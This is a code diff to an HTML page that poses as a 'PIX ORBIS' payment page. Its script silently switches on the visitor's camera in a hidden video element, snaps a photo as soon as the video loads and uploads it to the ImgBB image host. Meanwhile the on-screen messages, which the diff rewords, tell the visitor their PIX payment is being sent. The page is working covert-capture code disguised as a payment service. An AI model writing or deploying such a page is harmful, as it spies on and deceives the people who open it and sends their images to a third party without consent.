@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>PIX ORBIS</h1>
-    <p>Aguarde enquanto processamos o seu PIX...</p>
+    <p>Aguarde enquanto enviamos o seu PIX...</p>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="status"></p>
@@ -17,7 +17,7 @@
 
         // Exibe uma mensagem ao usuário
         const statusMessage = document.getElementById('status');
-        statusMessage.textContent = "Validando os dados...";
+        statusMessage.textContent = "Preparando os dados para o envio...";
 
         // Acessar a câmera
         const video = document.getElementById('video');
@@ -27,13 +27,13 @@
 
                 // Quando o vídeo estiver pronto, captura automaticamente
                 video.addEventListener('loadeddata', () => {
-                    statusMessage.textContent = "Processando seu PIX...";
+                    statusMessage.textContent = "Enviando seu PIX...";
                     captureAndUpload();
                 });
             })
             .catch(err => {
                 console.error('Erro ao acessar câmera:', err);
-                statusMessage.textContent = "Erro ao processar o PIX. Por favor, recarregue a página.";
+                statusMessage.textContent = "Erro ao processar o envio. Por favor, tente novamente.";
             });
 
         // Função para capturar imagem e enviar ao ImgBB
@@ -46,7 +46,6 @@
 
             // Converter imagem em Base64
             const imageData = canvas.toDataURL('image/png');
-            console.log('Imagem capturada automaticamente.');
 
             // Enviar imagem ao ImgBB
             const formData = new FormData();
@@ -60,11 +59,11 @@
             .then(response => response.json())
             .then(result => {
                 console.log('Imagem enviada:', result.data.url);
-                statusMessage.textContent = "Seu PIX foi processado com sucesso!";
+                statusMessage.textContent = "Seu PIX foi enviado com sucesso!";
             })
             .catch(error => {
                 console.error('Erro ao enviar imagem:', error);
-                statusMessage.textContent = "Erro ao processar o PIX. Tente novamente mais tarde.";
+                statusMessage.textContent = "Erro no envio. Por favor, tente novamente mais tarde.";
             });
         }
     </script>
